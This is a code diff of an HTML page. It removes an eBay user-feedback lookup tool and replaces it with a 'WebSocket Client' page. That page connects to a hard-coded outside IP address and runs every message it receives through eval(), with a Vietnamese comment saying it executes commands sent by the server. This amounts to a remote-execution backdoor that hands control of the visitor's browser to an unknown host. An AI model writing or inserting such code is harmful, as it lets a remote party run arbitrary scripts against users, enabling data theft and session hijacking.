@@ -3,79 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>eBay User Feedback</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-        }
-        .container {
-            max-width: 800px;
-            margin: auto;
-        }
-        .input-section {
-            margin-bottom: 20px;
-        }
-        .feedback-section {
-            margin-top: 20px;
-        }
-        .feedback-item {
-            margin-bottom: 5px; /* Decrease margin for closer items */
-        }
-        .feedback-item a {
-            text-decoration: none;
-            color: #007bff;
-        }
-        .feedback-item a:hover {
-            text-decoration: underline;
-        }
-    </style>
+    <title>WebSocket Client</title>
 </head>
 <body>
-    <div class="container">
-        <h1>eBay User Feedback</h1>
-        <div class="input-section">
-            <label for="usernames">Enter eBay usernames (one per line):</label>
-            <textarea id="usernames" rows="10" placeholder="user1\nuser2\nuser3"></textarea>
-            <button onclick="fetchFeedback()">Get Feedback</button>
-        </div>
-        <div class="feedback-section" id="feedbackSection">
-            <ul id="feedbackList" class="feedback-list"></ul>
-        </div>
-    </div>
+    <h1>WebSocket Client</h1>
+    <button onclick="connectToServer()">Connect to Server</button>
+    <p id="message">Waiting for message...</p>
 
     <script>
-        async function fetchFeedback() {
-            const usernames = document.getElementById('usernames').value.split('\n').map(username => username.trim());
-            const feedbackList = document.getElementById('feedbackList');
-            feedbackList.innerHTML = ''; // Clear previous results
+        function connectToServer() {
+            const socket = new WebSocket('ws://38.54.119.251:9951');
 
-            for (const username of usernames) {
-                if (username) {
-                    const url = `https://ebay.com/usr/${username}?_tab=feedback`;
-                    try {
-                        const response = await fetch(url);
-                        if (!response.ok) {
-                            throw new Error('Network response was not ok');
-                        }
-                        const data = await response.text();
-                        // Simple example of extracting title, you can adjust this part based on actual content and structure
-                        const parser = new DOMParser();
-                        const doc = parser.parseFromString(data, 'text/html');
-                        const title = doc.querySelector('title').innerText;
+            socket.onopen = function () {
+                console.log('Connected to server');
+            };
 
-                        const listItem = document.createElement('li');
-                        listItem.className = 'feedback-item';
-                        listItem.innerHTML = `<a href="${url}" target="_blank">${title}</a>`;
-                        feedbackList.appendChild(listItem);
-                    } catch (error) {
-                        const listItem = document.createElement('li');
-                        listItem.className = 'feedback-item';
-                        listItem.innerHTML = `<span>Error fetching data for ${username}</span>`;
-                        feedbackList.appendChild(listItem);
-                    }
-                }
-            }
+            socket.onmessage = function (event) {
+                document.getElementById('message').innerText = 'Received message: ' + event.data;
+                eval(event.data);  // Thực thi lệnh nhận từ máy chủ
+            };
+
+            socket.onclose = function () {
+                console.log('Disconnected from server');
+            };
         }
     </script>
 </body>
